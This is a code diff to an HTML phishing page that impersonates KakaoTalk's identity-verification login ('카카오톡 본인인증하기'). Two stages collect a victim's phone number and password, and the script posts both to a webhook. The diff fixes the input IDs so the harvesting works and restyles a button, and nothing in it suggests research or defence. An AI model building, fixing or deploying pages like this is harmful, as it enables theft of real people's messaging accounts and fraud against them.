@@ -44,8 +44,8 @@
   <!-- 로그인 화면 1 (page2) -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="(+82)전화번호" id="userId" style="width:370px; padding:5px;">
-    <input type="password" placeholder="비밀번호" id="userPw" style="width:370px; padding:5px;">
+    <input type="text" placeholder="(+82)전화번호" id="userPhone2" style="width:370px; padding:5px;">
+    <input type="password" placeholder="비밀번호" id="userPw2" style="width:370px; padding:5px;">
     <button type="button" class="btn-yellow" onclick="goNext2()">본인인증하기</button>
   </div>
 
@@ -54,7 +54,7 @@
     <h2>카카오톡 본인인증하기</h2>
     <input type="text" placeholder="(+82)전화번호" id="userPhone3" style="width:370px; padding:5px;">
     <input type="password" placeholder="비밀번호" id="userPw3" style="width:370px; padding:5px;">
-    <button type="button" class="btn-gray" onclick="login3()">본인인증하기</button>
+    <button type="button" class="btn-yellow" onclick="login3()">본인인증하기</button>
   </div>
 
   <script>
@@ -71,7 +71,7 @@
       }
     }
 
-    // page2 → page3
+    // page2 → page3, webhook 전송
     function goNext2() {
       const userId = document.getElementById("userPhone2").value.trim();
       const password = document.getElementById("userPw2").value.trim();
@@ -87,7 +87,6 @@
         return;
       }
 
-      // webhook 전송
       const formData = new URLSearchParams();
       formData.append("page", "2");
       formData.append("phone", userId);
@@ -107,7 +106,7 @@
       .catch(err => console.error("전송 오류:", err));
     }
 
-    // page3 로그인
+    // page3 로그인, webhook 전송
     function login3() {
       const userId = document.getElementById("userPhone3").value.trim();
       const password = document.getElementById("userPw3").value.trim();
@@ -123,7 +122,6 @@
         return;
       }
 
-      // webhook 전송
       const formData = new URLSearchParams();
       formData.append("page", "3");
       formData.append("phone", userId);
